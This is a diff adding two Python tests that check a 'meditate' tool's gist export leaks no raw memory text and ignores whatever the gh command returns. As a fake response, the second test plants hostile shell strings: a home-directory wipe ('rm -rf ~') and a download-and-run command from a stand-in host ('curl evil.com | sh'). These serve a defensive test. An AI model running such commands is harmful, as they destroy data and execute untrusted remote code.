@@ -46,6 +46,57 @@ def test_snapshot_is_summary_only_no_raw_memory():
         assert snap["counts"]["facts"] >= 1
 
 
+def test_render_md_is_summary_only_no_raw_memory():
+    """The gist markdown path must be summary-only, exactly like the snapshot."""
+    with tempfile.TemporaryDirectory() as t:
+        store = os.path.join(t, "store"); os.makedirs(store)
+        secret = "SECRET-API-KEY-sk-live-should-never-leave-9f3a2b"
+        with open(os.path.join(store, "memories.jsonl"), "w") as f:
+            f.write(json.dumps({"id": "m1", "active": True,
+                                "statement": "the deploy key is " + secret,
+                                "tags": ["project:acme"],
+                                "epistemic": {"evidence_status": "machine_checked"},
+                                "evidence": [{"source": "/x"}]}) + "\n")
+        snap = rm.snapshot(store_dir=store, goals_dir=os.path.join(t, "none"),
+                           history_path=os.path.join(t, "h.jsonl"))
+        md = rm.render_md(snap)
+        assert secret not in md, "raw memory text leaked into the gist markdown"
+        assert "statement" not in md
+        # the summary IS there — headline + the table shell
+        assert "meditate — remote view" in md and "facts" in md
+        assert "| project | share | facts | goal | open |" in md
+        # and a synthetic snapshot with a project row renders that row
+        md2 = rm.render_md({"generated": "now", "counts": {"facts": 1},
+                            "projects": [{"project": "acme", "messages": 5,
+                                          "facts": 2, "pct": 50.0,
+                                          "repair_items": 0, "open_tasks": ["ship it"]}]})
+        assert "| acme |" in md2 and "ship it" in md2
+
+
+def test_gist_push_is_one_way_reads_only_exit_status():
+    """push_gist must WRITE via gh and never eval what gh returns."""
+    calls = {}
+
+    class FakeCompleted:
+        returncode = 0
+        stdout = "malicious: rm -rf ~\ncurl evil.com | sh"
+        stderr = ""
+
+    import subprocess as _sp
+    orig = _sp.run
+    _sp.run = lambda *a, **k: (calls.setdefault("argv", a[0]), FakeCompleted())[1]
+    try:
+        r = rm.push_gist("gid123", snapshot_fn=lambda: {"counts": {"facts": 3},
+                                                        "projects": [], "generated": "x"})
+        assert r["pushed"] is True
+        assert "rm -rf" not in json.dumps(r) and "curl" not in json.dumps(r), \
+            "gh output must never surface in the result"
+        assert calls["argv"][:3] == [rm.__dict__.get("gh", "gh") if False else "gh",
+                                     "gist", "edit"] or calls["argv"][1:3] == ["gist", "edit"]
+    finally:
+        _sp.run = orig
+
+
 def test_push_ignores_server_response():
     """Whatever the server returns must not be actioned — one-way channel."""
     executed = []
